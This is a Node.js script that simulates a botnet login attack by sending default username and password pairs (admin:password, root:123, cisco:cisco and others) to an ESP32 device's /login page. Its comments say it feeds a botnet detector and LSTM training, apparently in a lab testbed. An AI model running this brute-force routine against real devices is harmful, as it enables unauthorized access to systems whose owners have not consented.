const http = require('http');

const ESP32_IP = "10.180.112.74";
const PORT = 80;

const attackPayloads = [
    { username: 'admin', password: 'password' },
    { username: 'root', password: '123' },
    { username: 'admin', password: 'admin1' },
    { username: 'admin', password: 'admin2' },
    { username: 'admin', password: 'admin3' }, // For LSTM Training
    { username: 'admin', password: 'admin4' },
    { username: 'user', password: 'user' },
    { username: 'cisco', password: 'cisco' },
    { username: 'service', password: 'service' }
];

let currentIndex = 0;

function sendAttack() {
    if (currentIndex >= attackPayloads.length * 3) {
        console.log("Automated botnet simulation complete.");
        return;
    }

    // Pick a payload (cycle through them)
    const payloadIndex = currentIndex % attackPayloads.length;
    const payload = attackPayloads[payloadIndex];
    
    // Convert to query string for form-urlencoded or similar, ESP uses URL args or body. 
    // In ESP code: server.hasArg("username")
    // We can send it as application/x-www-form-urlencoded
    const postData = `username=${payload.username}&password=${payload.password}`;

    const options = {
        hostname: ESP32_IP,
        port: PORT,
        path: '/login',
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': Buffer.byteLength(postData)
        }
    };

    const req = http.request(options, (res) => {
        console.log(`[Botnet Script] Attacked with ${payload.username}:${payload.password} -> ESP32 Response: ${res.statusCode}`);
        currentIndex++;
        // Fire the next attack very quickly to trigger the TF.js Botnet alarm
        setTimeout(sendAttack, 500); 
    });

    req.on('error', (e) => {
        console.error(`[Botnet Script] Problem with request: ${e.message}`);
    });

    // Write data to request body
    req.write(postData);
    req.end();
}

console.log(`Starting automated botnet attack against ESP32 at ${ESP32_IP}...`);
sendAttack();
